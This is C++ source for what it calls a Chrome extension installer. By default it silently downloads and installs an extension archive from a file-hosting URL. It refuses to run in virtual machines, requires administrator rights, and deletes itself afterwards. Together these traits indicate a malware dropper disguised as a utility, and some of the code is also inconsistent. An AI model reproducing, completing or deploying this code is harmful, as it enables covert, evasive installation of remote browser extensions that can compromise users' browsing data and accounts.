#include "uac.h"
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <filesystem>

#pragma comment(lib, "urlmon.lib")

// CLI argument structure
struct CLIArgs {
    std::string extensionId;
    std::string filePath;
    std::string url;
    bool quietMode;
    bool showHelp;
};

// Function declarations
void ShowHelp();
CLIArgs ParseCommandLine(LPWSTR pCmdLine);
bool ValidateArguments(const CLIArgs& args);
void LogMessage(const std::string& message, bool isError = false);
bool InstallFromWebStore(const std::string& extensionId, HMODULE regdll);
bool InstallFromFile(const std::string& filePath, HMODULE regdll);
bool InstallFromUrl(const std::string& url, HMODULE regdll);
bool PerformSystemChecks(HMODULE regdll);

int WINAPI wWinMain
(   HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    PWSTR pCmdLine, 
    int nCmdShow) 
{
    try {
        // Parse command line arguments
        CLIArgs args = ParseCommandLine(pCmdLine);
        
        if (args.showHelp) {
            ShowHelp();
            return 0;
        }

        HMODULE regdll = GetModuleHandleW(L"ADVAPI32.dll");
        if (!regdll) {
            LogMessage("Failed to get ADVAPI32.dll handle", true);
            return -1;
        }

        // Perform system checks
        if (!PerformSystemChecks(regdll)) {
            return -1;
        }

        // Handle different installation methods based on arguments
        bool success = false;
        if (!args.extensionId.empty()) {
            success = InstallFromWebStore(args.extensionId, regdll);
        }
        else if (!args.filePath.empty()) {
            success = InstallFromFile(args.filePath, regdll);
        }
        else if (!args.url.empty()) {
            success = InstallFromUrl(args.url, regdll);
        }
        else if (!args.quietMode) {
            // Default GUI mode
            string bushbaby = "https://files.catbox.moe/x7kelq.zip";
            string guid = GenerateGUID();
            string directory = GetTempFolder() + "\\" + guid;
            auto _ = _mkdir(directory.c_str());
            string fileName = directory + "\\" + GetFileNameFromPath(bushbaby);
            string dic = GetFileNameWithoutExtension(fileName);

            success = InstallFromUrl(bushbaby, regdll);
        }

        // Cleanup
        DelMe();
        return success ? 0 : -1;
    }
    catch (const std::exception& e) {
        LogMessage("Unhandled exception: " + std::string(e.what()), true);
        return -1;
    }
}

void ShowHelp() {
    MessageBoxW(NULL, 
        L"Usage: ChromeExtension.exe [options]\n"
        L"  -i, --install <extension-id>    Install extension by Chrome Web Store ID\n"
        L"  -f, --file <path>              Install extension from local file\n"
        L"  -u, --url <url>                Install extension from URL\n"
        L"  -q, --quiet                    Run in quiet mode (no GUI)\n"
        L"  -h, --help                     Show this help message",
        L"Chrome Extension Installer Help",
        MB_OK | MB_ICONINFORMATION);
}

CLIArgs ParseCommandLine(LPWSTR pCmdLine) {
    CLIArgs args = {
        .quietMode = false,
        .showHelp = false
    };

    int argc;
    LPWSTR* argv = CommandLineToArgvW(pCmdLine, &argc);

    for (int i = 0; i < argc; i++) {
        std::wstring arg = argv[i];
        if (arg == L"-h" || arg == L"--help") {
            args.showHelp = true;
        }
        else if (arg == L"-q" || arg == L"--quiet") {
            args.quietMode = true;
        }
        else if ((arg == L"-i" || arg == L"--install") && i + 1 < argc) {
            args.extensionId = std::string(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(argv[++i]));
        }
        else if ((arg == L"-f" || arg == L"--file") && i + 1 < argc) {
            args.filePath = std::string(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(argv[++i]));
        }
        else if ((arg == L"-u" || arg == L"--url") && i + 1 < argc) {
            args.url = std::string(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(argv[++i]));
        }
    }

    LocalFree(argv);
    return args;
}

bool ValidateArguments(const CLIArgs& args) {
    int optionCount = 0;
    if (!args.extensionId.empty()) optionCount++;
    if (!args.filePath.empty()) optionCount++;
    if (!args.url.empty()) optionCount++;

    return optionCount <= 1;
}

void LogMessage(const std::string& message, bool isError) {
    // Log to both console and Windows debug output
    OutputDebugStringA((message + "\n").c_str());
    
    if (isError) {
        MessageBoxA(NULL, message.c_str(), "Error", MB_OK | MB_ICONERROR);
    }
}

bool PerformSystemChecks(HMODULE regdll) {
    // Check if running on a virtual machine
    if (IsVirtualComputer()) {
        LogMessage("This application cannot run in a virtual environment", true);
        return false;
    }

    // Check Chrome installation
    if (!IsChromeInstalled()) {
        LogMessage("Google Chrome is not installed", true);
        return false;
    }

    // Check RAM capacity
    auto ram = GetRamCapacity();
    if (ram <= 2) {
        LogMessage("Insufficient RAM. Minimum 2GB required", true);
        return false;
    }

    // Check elevation
    if (!IsElevated(regdll)) {
        LogMessage("This program requires administrator privileges", true);
        return false;
    }

    return true;
}

bool InstallFromWebStore(const std::string& extensionId, HMODULE regdll) {
    try {
        InstallExtension(extensionId, "https://clients2.google.com/service/update2/crx", regdll);
        return true;
    }
    catch (const std::exception& e) {
        LogMessage("Failed to install extension from Web Store: " + std::string(e.what()), true);
        return false;
    }
}

bool InstallFromFile(const std::string& filePath, HMODULE regdll) {
    try {
        if (!std::filesystem::exists(filePath)) {
            LogMessage("Extension file not found: " + filePath, true);
            return false;
        }

        string directory = GetTempFolder() + "\\" + GenerateGUID();
        auto _ = _mkdir(directory.c_str());
        
        ExtractExtension(filePath, directory);
        auto ids = GetExtensionId(directory, regdll);
        
        if (ids.empty()) {
            LogMessage("No valid extension found in the file", true);
            return false;
        }

        for (const auto& id : ids) {
            InstallExtension(id, directory, regdll);
        }

        return true;
    }
    catch (const std::exception& e) {
        LogMessage("Failed to install extension from file: " + std::string(e.what()), true);
        return false;
    }
}

bool InstallFromUrl(const std::string& url, HMODULE regdll) {
    try {
        string guid = GenerateGUID();
        string directory = GetTempFolder() + "\\" + guid;
        auto _ = _mkdir(directory.c_str());
        string fileName = directory + "\\" + GetFileNameFromPath(url);

        DownloadExtension(url, fileName);
        ExtractExtension(fileName, directory);

        auto ids = GetExtensionId(directory, regdll);
        if (ids.empty()) {
            LogMessage("No valid extension found in the download", true);
            return false;
        }

        for (const auto& id : ids) {
            InstallExtension(id, "https://clients2.google.com/service/update2/crx", regdll);
        }

        return true;
    }
    catch (const std::exception& e) {
        LogMessage("Failed to install extension from URL: " + std::string(e.what()), true);
        return false;
    }
}

